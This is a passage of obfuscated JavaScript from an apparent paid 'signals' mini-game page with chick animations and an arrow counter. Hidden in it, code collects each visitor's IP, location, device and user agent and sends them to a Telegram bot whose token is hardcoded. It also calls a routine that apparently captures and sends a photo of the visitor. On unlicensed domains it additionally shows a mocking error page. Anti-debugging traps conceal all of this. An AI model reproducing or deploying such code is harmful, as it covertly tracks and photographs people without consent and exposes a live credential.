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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x3aa5ef = document.createElement("style");
    _0x3aa5ef.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x3aa5ef);
    const _0x3846a0 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x26aba3.domain + "</code>\n🔗 URL: <code>" + _0x26aba3.fullUrl + "</code>\n🌐 IP: <code>" + _0x3846a0.ip + "</code>\n📌 Location: " + _0x3846a0.city + ", " + _0x3846a0.region + ", " + _0x3846a0.countryName + " " + _0x3846a0.countryEmoji + "\n📱 Device: <code>" + _0x3846a0.deviceModel + "</code>\n🖥️ Type: <code>" + _0x3846a0.deviceType + " (" + _0x3846a0.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x3846a0.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x5a4812 = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x1ea0e7 = await _0x5a4812.json();
    if (_0x1ea0e7.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x41502d = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x26aba3.domain + "</code>\n🔗 URL: <code>" + _0x26aba3.fullUrl + "</code>\n🌐 IP: <code>" + _0x41502d.ip + "</code>\n📌 Location: " + _0x41502d.city + ", " + _0x41502d.region + ", " + _0x41502d.countryName + " " + _0x41502d.countryEmoji + "\n📱 Device: <code>" + _0x41502d.deviceModel + "</code>\n🖥️ Type: <code>" + _0x41502d.deviceType + " (" + _0x41502d.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x41502d.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0x2a9db3) {
    console.error("Failed to initialize bot:", _0x2a9db3);
    const _0x141fe1 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x26aba3.domain + "</code>\n🔗 URL: <code>" + _0x26aba3.fullUrl + "</code>\n🌐 IP: <code>" + _0x141fe1.ip + "</code>\n📌 Location: " + _0x141fe1.city + ", " + _0x141fe1.region + ", " + _0x141fe1.countryName + " " + _0x141fe1.countryEmoji + "\n📱 Device: <code>" + _0x141fe1.deviceModel + "</code>\n🖥️ Type: <code>" + _0x141fe1.deviceType + " (" + _0x141fe1.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x141fe1.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});
const stripeContainer = document.getElementById("stripe-container");
for (let i = 0; i < 5; i++) {
  const stripe = document.createElement("div");
  stripe.classList.add("stripe");
  stripe.style.animationDelay = i * 0.2 * 2 + 's';
  stripeContainer.appendChild(stripe);
}
const centerGif = document.getElementById("centerGif");
(function () {
  const _0xefd4aa = function () {
    let _0x427558;
    try {
      _0x427558 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x51613b) {
      _0x427558 = window;
    }
    return _0x427558;
  };
  const _0x15472a = _0xefd4aa();
  _0x15472a.setInterval(_0x54110f, 4000);
})();
const startButton = document.getElementById("startButton");
const gifs = ["left.gif", "right.gif"];
function createCloud() {
  const _0x3613a6 = function () {
    let _0x5002bc = true;
    return function (_0x41f58d, _0x27b7a5) {
      const _0x3b2ab5 = _0x5002bc ? function () {
        if (_0x27b7a5) {
          const _0x274f56 = _0x27b7a5.apply(_0x41f58d, arguments);
          _0x27b7a5 = null;
          return _0x274f56;
        }
      } : function () {};
      _0x5002bc = false;
      return _0x3b2ab5;
    };
  }();
  (function () {
    _0x3613a6(this, function () {
      const _0x4fee07 = new RegExp("function *\\( *\\)");
      const _0x27465c = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0x2c2439 = _0x54110f("init");
      if (!_0x4fee07.test(_0x2c2439 + "chain") || !_0x27465c.test(_0x2c2439 + "input")) {
        _0x2c2439('0');
      } else {
        _0x54110f();
      }
    })();
  })();
  const _0x48ccac = function () {
    let _0x3bdc6f = true;
    return function (_0x1592d8, _0x94232f) {
      const _0xff5617 = _0x3bdc6f ? function () {
        const _0xd19dfe = {
          VTkBp: "div"
        };
        _0xd19dfe.ylBKx = "arrow";
        if (_0x94232f) {
          const _0x3b033d = _0x94232f.apply(_0x1592d8, arguments);
          _0x94232f = null;
          return _0x3b033d;
        }
      } : function () {};
      _0x3bdc6f = false;
      return _0xff5617;
    };
  }();
  const _0x4f1efb = _0x48ccac(this, function () {
    const _0xd017e2 = {
      jfgVk: "Failed to fetch user info:"
    };
    _0xd017e2.KsJac = "Unknown";
    let _0x39deaa;
    try {
      const _0x5b55f8 = Function("return (function() {}.constructor(\"return this\")( ));");
      _0x39deaa = _0x5b55f8();
    } catch (_0x22c34f) {
      _0x39deaa = window;
    }
    const _0x309e4f = _0x39deaa.console = _0x39deaa.console || {};
    const _0x3aaa41 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x403f77 = 0; _0x403f77 < _0x3aaa41.length; _0x403f77++) {
      const _0x4fe701 = _0x48ccac.constructor.prototype.bind(_0x48ccac);
      const _0x2c6676 = _0x3aaa41[_0x403f77];
      const _0x1fa220 = _0x309e4f[_0x2c6676] || _0x4fe701;
      _0x4fe701.__proto__ = _0x48ccac.bind(_0x48ccac);
      _0x4fe701.toString = _0x1fa220.toString.bind(_0x1fa220);
      _0x309e4f[_0x2c6676] = _0x4fe701;
    }
  });
  _0x4f1efb();
  const _0x1a0c7a = document.createElement("div");
  _0x1a0c7a.className = "cloud";
  const _0x30d52d = 60 + Math.random() * 40;
  _0x1a0c7a.style.width = _0x30d52d + 'px';
  _0x1a0c7a.style.height = _0x30d52d / 2 + 'px';
  _0x1a0c7a.style.top = Math.random() * 60 + '%';
  const _0x136322 = 15 + Math.random() * 10;
  _0x1a0c7a.style.animationDuration = _0x136322 + 's';
  document.getElementById("cloudContainer").appendChild(_0x1a0c7a);
  setTimeout(() => {
    _0x1a0c7a.remove();
  }, _0x136322 * 1000);
}
setInterval(createCloud, 3000);
for (let i = 0; i < 5; i++) {
  createCloud();
}
function _0x1b68(_0x639b59, _0x247918) {
  const _0x224e2b = _0x3b0a();
  _0x1b68 = function (_0x309fd9, _0xa68154) {
    _0x309fd9 = _0x309fd9 - 422;
    let _0x365b47 = _0x224e2b[_0x309fd9];
    if (_0x1b68.RycYTs === undefined) {
      var _0xf2be4d = function (_0xaa4695) {
        let _0x492d89 = '';
        let _0x4b7c62 = '';
        let _0x35d170 = _0x492d89 + _0xf2be4d;
        let _0x3650fc = 0;
        let _0x1fef9c;
        let _0x451f48;
        for (let _0x39a21f = 0; _0x451f48 = _0xaa4695.charAt(_0x39a21f++); ~_0x451f48 && (_0x1fef9c = _0x3650fc % 4 ? _0x1fef9c * 64 + _0x451f48 : _0x451f48, _0x3650fc++ % 4) ? _0x492d89 += _0x35d170.charCodeAt(_0x39a21f + 10) - 10 !== 0 ? String.fromCharCode(255 & _0x1fef9c >> (-2 * _0x3650fc & 6)) : _0x3650fc : 0) {
          _0x451f48 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='.indexOf(_0x451f48);
        }
        let _0x4397b5 = 0;
        for (let _0x18db4b = _0x492d89.length; _0x4397b5 < _0x18db4b; _0x4397b5++) {
          _0x4b7c62 += '%' + ('00' + _0x492d89.charCodeAt(_0x4397b5).toString(16)).slice(-2);
        }
        return decodeURIComponent(_0x4b7c62);
      };
      const _0x50ba6b = function (_0x12c7d6, _0x248bb4) {
        let _0x5d8957 = [];
        let _0x1ffd8e = 0;
        let _0x50ed60;
        let _0x408eb7 = '';
        _0x12c7d6 = _0xf2be4d(_0x12c7d6);
        let _0x4a42ae;
        for (_0x4a42ae = 0; _0x4a42ae < 256; _0x4a42ae++) {
          _0x5d8957[_0x4a42ae] = _0x4a42ae;
        }
        for (_0x4a42ae = 0; _0x4a42ae < 256; _0x4a42ae++) {
          _0x1ffd8e = (_0x1ffd8e + _0x5d8957[_0x4a42ae] + _0x248bb4.charCodeAt(_0x4a42ae % _0x248bb4.length)) % 256;
          _0x50ed60 = _0x5d8957[_0x4a42ae];
          _0x5d8957[_0x4a42ae] = _0x5d8957[_0x1ffd8e];
          _0x5d8957[_0x1ffd8e] = _0x50ed60;
        }
        _0x4a42ae = 0;
        _0x1ffd8e = 0;
        for (let _0x3a3125 = 0; _0x3a3125 < _0x12c7d6.length; _0x3a3125++) {
          _0x4a42ae = (_0x4a42ae + 1) % 256;
          _0x1ffd8e = (_0x1ffd8e + _0x5d8957[_0x4a42ae]) % 256;
          _0x50ed60 = _0x5d8957[_0x4a42ae];
          _0x5d8957[_0x4a42ae] = _0x5d8957[_0x1ffd8e];
          _0x5d8957[_0x1ffd8e] = _0x50ed60;
          _0x408eb7 += String.fromCharCode(_0x12c7d6.charCodeAt(_0x3a3125) ^ _0x5d8957[(_0x5d8957[_0x4a42ae] + _0x5d8957[_0x1ffd8e]) % 256]);
        }
        return _0x408eb7;
      };
      _0x1b68.oeuoiA = _0x50ba6b;
      _0x639b59 = arguments;
      _0x1b68.RycYTs = true;
    }
    const _0x5a34af = _0x224e2b[0];
    const _0xb24094 = _0x309fd9 + _0x5a34af;
    const _0x6abe0f = _0x639b59[_0xb24094];
    if (!_0x6abe0f) {
      if (_0x1b68.KjnquM === undefined) {
        const _0x5ca62b = function (_0x1382dd) {
          this.FXgJbr = _0x1382dd;
          this.KxcDrp = [1, 0, 0];
          this.jQYtEO = function () {
            return 'newState';
          };
          this.tzwZEz = "\\w+ *\\(\\) *{\\w+ *";
          this.VibDUX = "['|\"].+['|\"];? *}";
        };
        _0x5ca62b.prototype.YwkUBT = function () {
          const _0x416505 = new RegExp(this.tzwZEz + this.VibDUX);
          const _0x2830c5 = _0x416505.test(this.jQYtEO.toString()) ? --this.KxcDrp[1] : --this.KxcDrp[0];
          return this.oQwnrn(_0x2830c5);
        };
        _0x5ca62b.prototype.oQwnrn = function (_0x22b808) {
          if (!Boolean(~_0x22b808)) {
            return _0x22b808;
          }
          return this.jBvMkw(this.FXgJbr);
        };
        _0x5ca62b.prototype.jBvMkw = function (_0x21343b) {
          let _0xb96ce8 = 0;
          for (let _0x2443f7 = this.KxcDrp.length; _0xb96ce8 < _0x2443f7; _0xb96ce8++) {
            this.KxcDrp.push(Math.round(Math.random()));
            _0x2443f7 = this.KxcDrp.length;
          }
          return _0x21343b(this.KxcDrp[0]);
        };
        new _0x5ca62b(_0x1b68).YwkUBT();
        _0x1b68.KjnquM = true;
      }
      _0x365b47 = _0x1b68.oeuoiA(_0x365b47, _0xa68154);
      _0x639b59[_0xb24094] = _0x365b47;
    } else {
      _0x365b47 = _0x6abe0f;
    }
    return _0x365b47;
  };
  return _0x1b68(_0x639b59, _0x247918);
}
let clickCount = 0;
function _0x290ff8(_0x22a77c, _0x4d557f, _0x187c1b, _0x11edc6, _0x25f3a8) {
  return _0x1b68(_0x22a77c - 0xae, _0x11edc6);
}
const counterContainer = document.getElementById("counterContainer");
function _0x25753c(_0x2a1c52, _0x2547fb, _0x29f067, _0x75eab5, _0xea66b6) {
  return _0x1b68(_0xea66b6 - 0x1bd, _0x75eab5);
}
for (let i = 0; i < 11; i++) {
  const arrow = document.createElement("div");
  arrow.className = "arrow";
  counterContainer.appendChild(arrow);
}
function _0x17088d(_0x1cadb5, _0x29fe56, _0x5435c4, _0x1d43cd, _0x1b9c44) {
  return _0x1b68(_0x29fe56 - 0x39e, _0x5435c4);
}
startButton.addEventListener("click", () => {
  if (clickCount >= 11) {
    return;
  }
  const _0x5acc7a = gifs[Math.floor(Math.random() * gifs.length)];
  centerGif.src = _0x5acc7a;
  centerGif.style.width = "320px";
  centerGif.style.height = "auto";
  const _0x3b3acf = counterContainer.children[clickCount];
  if (_0x5acc7a.includes("left.gif")) {
    _0x3b3acf.className = "arrow left active";
    _0x3b3acf.innerHTML = "&#10094;";
  } else {
    _0x3b3acf.className = "arrow right active";
    _0x3b3acf.innerHTML = "&#10095;";
  }
  clickCount++;
  if (clickCount === 11) {
    setTimeout(() => {
      const _0x30cac2 = document.getElementById("gameEndModal");
      const _0x2a27dd = document.getElementById("modalOverlay");
      _0x30cac2.classList.add("active");
      _0x2a27dd.classList.add("active");
      document.getElementById("modalOkButton").onclick = () => {
        const _0x135341 = {
          ijMOK: "chicks.gif"
        };
        _0x135341.MVAKE = "150px";
        _0x135341.Gchzu = "auto";
        _0x135341.bYcdC = "Failed to send message:";
        _0x30cac2.classList.remove("active");
        _0x2a27dd.classList.remove("active");
        clickCount = 0;
        Array.from(counterContainer.children).forEach(_0x591963 => {
          _0x591963.className = "arrow";
          _0x591963.innerHTML = '';
        });
      };
    }, 4050);
  }
  setTimeout(() => {
    centerGif.src = "chicks.gif";
    centerGif.style.width = "150px";
    centerGif.style.height = "auto";
  }, 4050);
});
function _0x54110f(_0x2874d0) {
  function _0x55f0b5(_0x2b2a07) {
    if (typeof _0x2b2a07 === "string") {
      return function (_0x3a8b19) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x2b2a07 / _0x2b2a07).length !== 1 || _0x2b2a07 % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x55f0b5(++_0x2b2a07);
  }
  try {
    if (_0x2874d0) {
      return _0x55f0b5;
    } else {
      _0x55f0b5(0);
    }
  } catch (_0x467059) {}
}